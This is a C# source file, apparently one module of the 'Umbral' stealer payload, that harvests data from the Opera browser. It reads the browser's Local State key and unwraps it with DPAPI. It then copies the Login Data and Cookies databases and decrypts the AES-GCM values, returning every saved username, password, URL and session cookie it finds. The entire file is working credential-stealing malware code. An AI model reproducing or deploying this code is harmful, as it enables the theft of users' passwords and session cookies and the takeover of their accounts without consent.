using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Umbral.payload.Components.Helpers;
using Umbral.payload.Components.Algorithms;
using Umbral.payload.Components.Utilities;

namespace Umbral.payload.Components.Browsers
{
    internal static class Opera
    {
        static private readonly string BrowserPath;

        static private byte[] _encryptionKey;

        static Opera()
        {
            BrowserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Opera Software", "Opera Stable");

            _encryptionKey = null;
        }

        static private async Task<byte[]> GetEncryptionKey()
        {
            if (!(_encryptionKey is null)) return _encryptionKey;

            byte[] key = null;

            string localStatePath = Path.Combine(BrowserPath, "Local State");
            if (File.Exists(localStatePath))
                try
                {
                    string content;

                    using (FileStream fs = new FileStream(localStatePath, FileMode.Open, FileAccess.Read,
                               FileShare.ReadWrite))
                    {
                        using (StreamReader reader = new StreamReader(fs))
                        {
                            content = await reader.ReadToEndAsync();
                        }
                    }

                    dynamic jsonContent = SimpleJson.DeserializeObject(content);
                    string encryptedKey = (string)jsonContent["os_crypt"]["encrypted_key"];
                    key = ProtectedData.Unprotect(Convert.FromBase64String(encryptedKey).Skip(5).ToArray(), null,
                        DataProtectionScope.CurrentUser);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }

            if (!(key is null))
            {
                _encryptionKey = key;
                return _encryptionKey;
            }

            return null;
        }

        static private async Task<byte[]> DecryptData(byte[] buffer)
        {
            byte[] decryptedData = null;
            byte[] key = await GetEncryptionKey();

            if (key is null)
            {
                return null;
            }

            try
            {

                string bufferString = Encoding.Default.GetString(buffer);
                if (bufferString.StartsWith("v10") || bufferString.StartsWith("v11"))
                {
                    byte[] iv = buffer.Skip(3).Take(12).ToArray();
                    byte[] cipherText = buffer.Skip(15).ToArray();

                    byte[] tag = cipherText.Skip(cipherText.Length - 16).ToArray();
                    cipherText = cipherText.Take(cipherText.Length - tag.Length).ToArray();

                    decryptedData = new AesGcm().Decrypt(key, iv, null, cipherText, tag);
                }
                else
                {
                    decryptedData = ProtectedData.Unprotect(buffer, null, DataProtectionScope.CurrentUser);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }

            return decryptedData;
        }

        internal static async Task<PasswordFormat[]> GetPasswords()
        {
            var passwords = new List<PasswordFormat>();

            if (Directory.Exists(BrowserPath) && !(await GetEncryptionKey() is null))
            {
                string[] loginDataPaths = await Task.Run(() =>
                    Directory.GetFiles(BrowserPath, "Login Data", SearchOption.AllDirectories));

                foreach (string loginDataPath in loginDataPaths)
                    try
                    {
                        retry:
                        string tempLoginDataPath = Path.Combine(Path.GetTempPath(), Common.GenerateRandomString(15));
                        if (File.Exists(tempLoginDataPath)) goto retry;

                        File.Copy(loginDataPath, tempLoginDataPath);

                        SQLiteHandler handler = new SQLiteHandler(tempLoginDataPath);

                        if (!handler.ReadTable("logins"))
                            continue;

                        for (int i = 0; i < handler.GetRowCount(); i++)
                        {
                            string url = handler.GetValue(i, "origin_url");
                            string username = handler.GetValue(i, "username_value");
                            byte[] encryptedPassword = Encoding.Default.GetBytes(handler.GetValue(i, "password_value"));

                            byte[] password = await DecryptData(encryptedPassword);

                            if (!string.IsNullOrWhiteSpace(url) && !string.IsNullOrWhiteSpace(username) &&
                                !(password is null) && password.Length > 0)
                            {
                                passwords.Add(new PasswordFormat(username, Encoding.UTF8.GetString(password), url));
                            }
                        }

                        File.Delete(tempLoginDataPath);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
            }

            return passwords.ToArray();
        }

        internal static async Task<CookieFormat[]> GetCookies()
        {
            var cookies = new List<CookieFormat>();

            if (Directory.Exists(BrowserPath) && !(await GetEncryptionKey() is null))
            {
                string[] cookiesFilePaths = await Task.Run(() =>
                    Directory.GetFiles(BrowserPath, "Cookies", SearchOption.AllDirectories));

                foreach (string cookiesFilePath in cookiesFilePaths)
                    try
                    {
                        retry:
                        string tempCookiesFilePath = Path.Combine(Path.GetTempPath(), Common.GenerateRandomString(15));
                        if (File.Exists(tempCookiesFilePath)) goto retry;

                        File.Copy(cookiesFilePath, tempCookiesFilePath);

                        SQLiteHandler handler = new SQLiteHandler(tempCookiesFilePath);

                        if (!handler.ReadTable("cookies"))
                            continue;

                        for (int i = 0; i < handler.GetRowCount(); i++)
                        {
                            string host = handler.GetValue(i, "host_key");
                            string name = handler.GetValue(i, "name");
                            string path = handler.GetValue(i, "path");
                            byte[] encryptedCookie = Encoding.Default.GetBytes(handler.GetValue(i, "encrypted_value"));
                            ulong expiry = Convert.ToUInt64(handler.GetValue(i, "expires_utc"));

                            byte[] cookie = await DecryptData(encryptedCookie);

                            if (!string.IsNullOrWhiteSpace(host) && !string.IsNullOrWhiteSpace(name) && !(cookie is null) &&
                                cookie.Length > 0)
                                cookies.Add(new CookieFormat(host, name, path, Encoding.UTF8.GetString(cookie), expiry));
                        }

                        File.Delete(tempCookiesFilePath);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
            }

            return cookies.ToArray();
        }
    }
}